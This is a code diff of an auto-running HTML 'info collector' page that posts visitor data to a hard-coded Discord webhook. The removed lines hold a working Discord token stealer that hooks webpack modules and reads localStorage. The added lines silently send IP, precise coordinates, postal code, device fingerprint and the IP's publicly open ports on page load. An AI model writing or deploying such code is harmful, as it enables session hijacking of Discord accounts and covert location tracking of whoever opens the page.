@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Info Collector (Local Only)</title>
+  <title>Max Info Collector + Ports (Local Only)</title>
   <style>
     body {
       font-family: system-ui, sans-serif;
@@ -20,170 +20,176 @@
       background: #161b22;
       border-radius: 12px;
       padding: 40px;
-      max-width: 600px;
+      max-width: 700px;
       width: 100%;
       box-shadow: 0 10px 30px rgba(0,0,0,0.6);
       text-align: center;
     }
-    h1 {
-      color: #58a6ff;
-      margin-bottom: 20px;
-    }
-    .status {
-      font-size: 1.2rem;
-      margin: 20px 0;
-    }
+    h1 { color: #58a6ff; margin-bottom: 20px; }
+    .status { font-size: 1.3rem; margin: 25px 0; }
     .success { color: #3fb950; }
-    .error   { color: #f85149; }
+    .error { color: #f85149; }
     .warning {
       background: #442111;
       color: #ff9e9e;
-      padding: 15px;
+      padding: 18px;
       border-radius: 8px;
-      margin: 20px 0;
+      margin: 25px 0;
     }
-    .instructions {
-      font-size: 0.95rem;
-      color: #8b949e;
-      margin-top: 20px;
-    }
-    .token-box {
+    .ports-list {
       background: #0d1117;
-      color: #f78166;
-      font-family: monospace;
       padding: 12px;
       border-radius: 8px;
       margin: 15px 0;
-      word-break: break-all;
-      border: 1px solid #30363d;
+      font-family: monospace;
+      text-align: left;
+    }
+    .instructions {
+      font-size: 1rem;
+      color: #8b949e;
+      margin-top: 25px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Local Info Collector</h1>
+    <h1>Max Info Collector + Ports</h1>
     <div class="warning">
-      ⚠️ This page will send your IP, browser info, Discord token (if detected), and location to your webhook.<br>
-      <strong>Open Discord in the same browser first!</strong>
+      ⚠️ Collects IP, full location, device info, and publicly open ports → sends to your webhook.<br>
+      <strong>Only open locally!</strong>
     </div>
-    <div id="status" class="status">Collecting info...</div>
-    <div id="tokenDisplay" class="token-box" style="display:none;"></div>
+    <div id="status" class="status">Collecting & sending info...</div>
+    <div id="ports" class="ports-list" style="display:none;"></div>
 
     <div class="instructions">
       <p><strong>Setup:</strong></p>
-      <ol style="text-align:left; max-width:500px; margin:0 auto;">
+      <ol style="text-align:left; max-width:550px; margin:0 auto;">
         <li>Replace <code>YOUR_WEBHOOK_URL_HERE</code> with your Discord webhook URL</li>
-        <li>Open Discord web (discord.com/app) in this browser</li>
-        <li>Open/save this HTML file locally</li>
+        <li>Save & open this file locally (double-click)</li>
+        <li>All info (including ports) will be sent silently</li>
       </ol>
+      <p style="margin-top:15px;">Note: Most home connections show 0 public ports due to NAT/router.</p>
     </div>
   </div>
 
   <script>
     // === CHANGE THIS TO YOUR OWN WEBHOOK URL ===
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455052799493800151/u3ru2dK_58PLrguELCjX6h3H4Swf0xGbNxfJmgXoAaA9nqCPA0V0EJWrQobcA2SDa5nA'; // e.g. https://discord.com/api/webhooks/1234567890/abcDEF...
-
-    // Improved Discord token detection (2025-compatible)
-    function getDiscordToken() {
-      let token = null;
-
-      // First try: webpack module hooking (most reliable now)
-      try {
-        window.webpackChunkdiscord_app?.push([[Symbol()], {}, (req) => {
-          for (const m of Object.values(req.c)) {
-            try {
-              if (m?.exports?.getToken) {
-                token = m.exports.getToken();
-                break;
-              }
-              for (const k in m.exports) {
-                if (m.exports[k]?.getToken && k !== 'IntlMessagesProxy') {
-                  token = m.exports[k].getToken();
-                  break;
-                }
-              }
-            } catch {}
-          }
-        }]);
-        window.webpackChunkdiscord_app?.pop();
-      } catch {}
-
-      // Fallback 1: iframe localStorage trick (works in some cases)
-      if (!token) {
-        try {
-          const iframe = document.createElement('iframe');
-          document.body.appendChild(iframe);
-          token = JSON.parse(iframe.contentWindow.localStorage.token || 'null');
-          iframe.remove();
-        } catch {}
-      }
-
-      // Fallback 2: old localStorage (rarely works anymore)
-      if (!token) {
-        token = localStorage.getItem('token')?.replace(/"/g, '') || null;
-      }
-
-      return token || 'Not detected (try manual method: DevTools → Network → Authorization header)';
-    }
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455052799493800151/u3ru2dK_58PLrguELCjX6h3H4Swf0xGbNxfJmgXoAaA9nqCPA0V0EJWrQobcA2SDa5nA';
 
     async function collectAndSend() {
       const status = document.getElementById('status');
-      const tokenDisplay = document.getElementById('tokenDisplay');
+      const portsDiv = document.getElementById('ports');
 
       try {
-        // Get Discord token
-        const discordToken = getDiscordToken();
-        tokenDisplay.textContent = `Discord Token: ${discordToken}`;
-        tokenDisplay.style.display = 'block';
-
-        // Get IP
+        // 1. Public IP
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const { ip } = await ipRes.json();
 
-        // Get geo info
+        // 2. Detailed geo info
         const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-        const geoData = await geoRes.json();
+        const geo = await geoRes.json();
 
-        // Browser info
-        const browserInfo = (() => {
-          const ua = navigator.userAgent;
-          let name = 'Unknown', ver = '';
-          if (ua.includes('Firefox')) { name = 'Firefox'; ver = ua.match(/Firefox\/([\d.]+)/)?.[1] || ''; }
-          else if (ua.includes('Edg/')) { name = 'Edge'; ver = ua.match(/Edg\/([\d.]+)/)?.[1] || ''; }
-          else if (ua.includes('Chrome')) { name = 'Chrome'; ver = ua.match(/Chrome\/([\d.]+)/)?.[1] || ''; }
-          else if (ua.includes('Safari')) { name = 'Safari'; ver = ua.match(/Version\/([\d.]+)/)?.[1] || ''; }
-          return `${name} ${ver}`.trim();
-        })();
+        // 3. Browser & Device info
+        const device = {
+          browser: (() => {
+            const ua = navigator.userAgent;
+            let name = 'Unknown', ver = '';
+            if (ua.includes('Firefox')) { name = 'Firefox'; ver = ua.match(/Firefox\/([\d.]+)/)?.[1] || ''; }
+            else if (ua.includes('Edg/')) { name = 'Edge'; ver = ua.match(/Edg\/([\d.]+)/)?.[1] || ''; }
+            else if (ua.includes('Chrome')) { name = 'Chrome'; ver = ua.match(/Chrome\/([\d.]+)/)?.[1] || ''; }
+            else if (ua.includes('Safari')) { name = 'Safari'; ver = ua.match(/Version\/([\d.]+)/)?.[1] || ''; }
+            return `${name} ${ver}`.trim();
+          })(),
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language || navigator.userLanguage,
+          languages: navigator.languages?.join(', ') || '—',
+          screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bit)`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          hardwareConcurrency: navigator.hardwareConcurrency || '—',
+          deviceMemory: navigator.deviceMemory || '—',
+          connection: navigator.connection?.effectiveType || '—',
+          downlink: navigator.connection?.downlink || '—'
+        };
 
-        // Build embed payload
+        // 4. Publicly open ports (Shodan InternetDB first, then Censys fallback)
+        let openPorts = [];
+        let portSource = 'None';
+        let portDetails = [];
+
+        try {
+          const shodanRes = await fetch(`https://internetdb.shodan.io/${ip}`);
+          const shodanData = await shodanRes.json();
+          if (shodanData.ports && shodanData.ports.length > 0) {
+            openPorts = shodanData.ports;
+            portSource = 'Shodan InternetDB';
+            portDetails = shodanData.ports.map(p => `${p} (TCP)`); // Shodan only lists ports
+          }
+        } catch {}
+
+        // Fallback to Censys if Shodan has no ports
+        if (openPorts.length === 0) {
+          try {
+            const censysRes = await fetch(`https://search.censys.io/api/v2/hosts/${ip}`, {
+              headers: { 'Accept': 'application/json' }
+            });
+            if (censysRes.ok) {
+              const censysData = await censysRes.json();
+              const services = censysData.result?.services || [];
+              openPorts = services.map(s => s.port);
+              portDetails = services.map(s => `${s.port}/${(s.service_name || 'TCP').toUpperCase()}`);
+              portSource = 'Censys';
+            }
+          } catch {}
+        }
+
+        // Display ports on page
+        portsDiv.innerHTML = `<strong>Publicly Open Ports (${portSource}):</strong><br>` +
+          (portDetails.length > 0 
+            ? portDetails.map(p => `- ${p}`).join('<br>') 
+            : 'None detected (normal for home connections)');
+        portsDiv.style.display = 'block';
+
+        // 5. Build webhook payload
         const payload = {
-          content: '**New device info collected**',
+          content: '**Max Info + Ports Collected**',
           embeds: [{
-            title: 'User & Network Info',
+            title: 'Device & Network Details',
             color: 0x5865F2,
             fields: [
               { name: 'IP', value: ip, inline: true },
-              { name: 'Location', value: `${geoData.city || '—'}, ${geoData.region || '—'}, ${geoData.country_name || '—'}`, inline: true },
-              { name: 'Lat/Lon', value: `${geoData.latitude?.toFixed(4) || '—'}, ${geoData.longitude?.toFixed(4) || '—'}`, inline: true },
-              { name: 'ISP/Org', value: geoData.org || '—', inline: true },
-              { name: 'Browser', value: browserInfo, inline: true },
-              { name: 'Discord Token', value: `\`\`\`${discordToken}\`\`\``, inline: false }
+              { name: 'Location', value: `${geo.city || '—'}, ${geo.region || '—'}, ${geo.country_name || '—'} (${geo.country_code || '—'})`, inline: true },
+              { name: 'Lat / Lon', value: `${geo.latitude?.toFixed(6) || '—'}, ${geo.longitude?.toFixed(6) || '—'}`, inline: true },
+              { name: 'Postal / ZIP', value: geo.postal || '—', inline: true },
+              { name: 'Timezone', value: geo.timezone || device.timezone, inline: true },
+              { name: 'ISP / Org', value: geo.org || '—', inline: true },
+              { name: 'Hostname', value: geo.hostname || '—', inline: true },
+              { name: 'Browser', value: device.browser, inline: true },
+              { name: 'Platform', value: device.platform, inline: true },
+              { name: 'Screen', value: device.screen, inline: true },
+              { name: 'Connection Type', value: device.connection, inline: true },
+              { name: 'Downlink Speed', value: `${device.downlink} Mbps`, inline: true },
+              { name: 'Languages', value: device.languages, inline: false },
+              { name: 'Open Ports', value: portDetails.length > 0 ? portDetails.join(', ') : 'None', inline: false },
+              { name: 'Port Source', value: portSource, inline: true },
+              { name: 'User Agent', value: `\`\`\`${device.userAgent}\`\`\``, inline: false },
+              { name: 'Collected At', value: new Date().toLocaleString(), inline: false }
             ],
-            footer: { text: `Time: ${new Date().toLocaleString()}` }
+            footer: { text: `Page: ${window.location.href}` }
           }]
         };
 
-        // Send to webhook
+        // 6. Send to webhook
         const res = await fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
 
-        if (!res.ok) throw new Error(`Webhook error: ${res.status}`);
+        if (!res.ok) throw new Error(`Webhook failed: ${res.status}`);
 
         status.className = 'status success';
-        status.textContent = 'Successfully sent to your webhook!';
+        status.textContent = 'All info & ports sent successfully!';
       } catch (err) {
         status.className = 'status error';
         status.textContent = `Error: ${err.message}`;
@@ -191,7 +197,6 @@
       }
     }
 
-    // Auto-run on load
     window.addEventListener('load', collectAndSend);
   </script>
 </body>
